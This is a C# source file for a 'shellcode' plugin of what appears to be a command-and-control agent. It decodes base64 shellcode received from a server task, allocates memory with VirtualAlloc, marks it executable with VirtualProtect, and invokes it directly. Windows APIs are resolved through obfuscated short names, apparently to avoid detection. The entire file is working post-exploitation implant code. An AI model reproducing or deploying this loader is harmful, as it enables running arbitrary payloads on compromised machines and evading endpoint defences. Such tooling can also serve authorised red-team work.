using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Linq;
using System.Net.NetworkInformation;
using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Text.Json;
using Invoker.Dynamic;
using System;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "shellcode";
        private delegate void BufferDelegate();
        private enum MemoryProtection : UInt32
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }
        private delegate bool VPDelegate(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        private delegate IntPtr VADelegate(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        private delegate IntPtr CTTFDelegate (IntPtr lpParameter);
        private delegate IntPtr CFDelegate(int dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter);

        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }
        private string output_task_id { get; set; }
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
        }
        public async Task Execute(ServerJob job)
        {

            List<string> resolvFuncs = new List<string>()
            {
                "vp",
                "va"
            };

            if (!Resolver.TryResolveFuncs(resolvFuncs, "k32", out var err))
            {
                await messageManager.WriteLine(err, job.task.id, true, "error");
                return;
            }

            ShellcodeArgs args = JsonSerializer.Deserialize<ShellcodeArgs>(job.task.parameters);

            if (!args.Validate())
            {
                await messageManager.AddResponse(new TaskResponse()
                {
                    completed = true,
                    user_output = "Missing Shellcode Bytes",
                    task_id = job.task.id,
                    status = "success"
                });
                return;
            }


            byte[] buffer = Convert.FromBase64String(args.asm);
            object[] vaParams = new object[] { IntPtr.Zero, (uint)buffer.Length, (uint)0x1000, (uint)0x04 };
            IntPtr bufAddr = Generic.InvokeFunc<IntPtr>(Resolver.GetFunc("va"), typeof(VADelegate), ref vaParams);

            if (bufAddr == IntPtr.Zero)
            {
                await messageManager.AddResponse(new TaskResponse()
                {
                    completed = true,
                    user_output = $"err VirtualAlloc ({Marshal.GetLastPInvokeError()})",
                    task_id = job.task.id,
                    status = "success"
                });
                return;
            }

            Marshal.Copy(buffer, 0, bufAddr, buffer.Length);

            uint oldProtect = 0;
            object[] vpParams = new object[] { bufAddr, (UIntPtr)buffer.Length, (uint)0x20, oldProtect };

            bool result = Generic.InvokeFunc<bool>(Resolver.GetFunc("vp"), typeof(VPDelegate), ref vpParams);
            if (!result)
            {
                await messageManager.AddResponse(new TaskResponse()
                {
                    completed = true,
                    user_output = $"err VirtualProtect ({Marshal.GetLastPInvokeError()})",
                    task_id = job.task.id,
                    status = "success"
                });
                return;
            }

            // Create a delegate to the shellcode
            BufferDelegate shellcodeDelegate = (BufferDelegate)Marshal.GetDelegateForFunctionPointer(bufAddr, typeof(BufferDelegate));
            try
            {
                shellcodeDelegate.Invoke();
            }
            catch
            {
                await messageManager.AddResponse(new TaskResponse()
                {
                    completed = false,
                    process_response = new Dictionary<string, string> { { "message", "0x44" } },
                    task_id = job.task.id,
                    status = "error"
                });
            }
        }
    }
}